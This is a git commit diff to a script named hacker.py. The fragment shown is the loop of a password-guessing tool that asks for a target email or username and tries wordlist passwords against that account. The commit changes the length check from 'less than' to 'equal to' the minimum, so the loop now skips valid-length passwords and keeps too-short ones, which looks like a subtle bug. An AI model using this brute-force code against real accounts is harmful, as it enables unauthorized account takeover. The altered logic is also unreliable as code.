2394816be20c61d5f9f1a5ec30c6f9b211c7d86a
Felipe Gomes da Silva <felipegs2905@gmail.com>
2021-05-06 11:13:53 -0300

    Update hacker.py

--- hacker.py
+++ hacker.py
@@ -55,7 +55,7 @@ if __name__ == "__main__":
     email = input('Enter Email/Username to target: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
-        if len(password) < MIN_PASSWORD_LENGTH:
+        if len(password) == MIN_PASSWORD_LENGTH:
             continue
         print("Trying password [", index, "]: ", password)
         if is_this_a_password(email, index, password):
